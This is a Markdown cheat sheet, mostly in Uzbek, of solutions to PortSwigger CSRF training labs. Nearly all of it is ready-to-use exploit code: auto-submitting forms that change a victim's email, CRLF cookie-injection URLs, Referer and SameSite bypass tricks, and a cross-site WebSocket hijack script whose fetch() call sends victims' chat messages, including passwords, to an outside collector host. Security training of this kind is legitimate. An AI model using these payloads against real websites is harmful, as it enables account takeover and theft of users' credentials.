# CSRF — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Asosiy PoC har doim bitta: email o'zgartirish formasini auto-submit qilish.
> Email'ni har safar o'zingникidan boshqa qil (band bo'lgan email qabul qilinmaydi).

### Base PoC (no-defenses) — APPRENTICE
Hech qanday himoya yo'q. Shunchaki avtomat submit.
```html
<form method="POST" action="https://example.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

---

## Token validation bypass

### Token validation faqat method'ga bog'liq — APPRENTICE
POST'da token tekshiriladi, GET'da yo'q → GET formaga o'tkazasan.
```html
<form action="https://example.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

### Token faqat mavjud bo'lsa tekshiriladi — APPRENTICE
`csrf` parametrini butunlay o'chirsang — qabul qilinadi. Base PoC'dan `csrf` ni olib tashla.
```html
<form method="POST" action="https://example.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

### Token session'ga bog'lanmagan — PRACTITIONER
Boshqa user tokeni ham ishlaydi. O'zingdan yangi token olib, PoC'ga qo'yasan.
```html
<form action="https://example.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil-user.net" />
  <input type="hidden" name="csrf" value="FRESH_TOKEN_HERE" />
</form>
<script>document.forms[0].submit();</script>
```
> Token single-use — oxirgi exploit uchun yangi token ol.

### Token non-session cookie'ga bog'langan — PRACTITIONER
`csrfKey` cookie'ni search orqali victim'ga inject qilib (CRLF), o'z token/key juftligingni qo'yasan.
```html
<img src="https://example.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
> Form'da `csrf=YOUR-TOKEN` bo'lsin. `%0d%0a` = CRLF → Set-Cookie inject.

### Token cookie'da dublikat qilingan — PRACTITIONER
Server `csrf` body'ni faqat `csrf` cookie'ga solishtiradi → ikkisini ham `fake` qil.
```html
<img src="https://example.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```
> Form'da `csrf=fake`. Cookie ham `fake` → ikkisi mos → qabul.

---

## Referer-based bypass

### Referer faqat mavjud bo'lsa tekshiriladi — PRACTITIONER
Referer'ni butunlay o'chirasan:
```html
<meta name="referrer" content="no-referrer">
```

### Broken Referer validation — PRACTITIONER
Server lab domenini Referer'ning istalgan joyida qidiradi → query'ga qo'shasan.
```js
history.pushState("", "", "/?example.com")
```
> Exploit server "Head" bo'limiga: `Referrer-Policy: unsafe-url` (query stripping oldini oladi).

---

## SameSite bypass

### SameSite Lax bypass via method override — PRACTITIONER
Cookie Lax (default) → top-level GET'da jo'natiladi. `_method=POST` bilan GET'ni POST qilasan.
```html
<script> document.location = "https://example.com/my-account/change-email?email=attacker@evil-user.net&_method=POST"; </script>
```

### SameSite Strict bypass via client-side redirect — PRACTITIONER
Same-site redirect (comment confirmation) + path traversal → cookie saqlanadi.
```html
<script>
document.location = "https://example.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil-user.net%26submit=1";
</script>
```
> `&` = `%26` (postId ichida qolishi uchun). Endpoint GET qabul qilishini tekshir.

### SameSite Strict bypass via sibling domain (CSWSH) — PRACTITIONER
`/chat` WebSocket hijack. Session Strict → sibling domendagi (`cms-example.com`) reflected XSS
orqali same-site'dan ulanasan. CSWSH script:
```html
<script>
var ws = new WebSocket('wss://example.com/chat');
ws.onopen = function() { ws.send("READY"); };
ws.onmessage = function(event) {
  fetch('https://COLLAB.example.net', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```
Buni URL-encode qilib, sibling domen login'iga `username` param qilib jo'natasan:
```html
<script>
document.location = "https://cms-example.com/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```
> Sibling domen `Access-Control-Allow-Origin` header'ida ko'rinadi. Chat history'da victim user/parol.

---

### Eslatma
Burp Pro: Engagement tools → Generate CSRF PoC (auto-submit yoqib regenerate). Himoya:
SameSite=Strict + session'ga bog'langan unpredictable token. Umumiy: bu papka README.
